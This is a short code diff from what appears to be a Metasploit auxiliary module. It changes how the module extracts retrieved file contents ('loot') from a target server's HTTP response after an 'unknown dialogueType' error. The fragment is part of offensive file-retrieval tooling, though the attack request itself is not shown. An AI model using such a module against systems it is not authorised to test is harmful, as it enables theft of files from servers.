@@ -97,8 +97,8 @@ class Metasploit4 < Msf::Auxiliary
 
 		if res and res.code == 200
 			case res.body
-			when /has sent unknown dialogueType/
-				loot = 1
+			when /has sent unknown dialogueType \?(.*)/m
+				loot = $1
 				if not loot or loot.empty?
 					print_status("#{rhost}:#{rport} Retrieved empty file from #{rhost}:#{rport}")
 					return
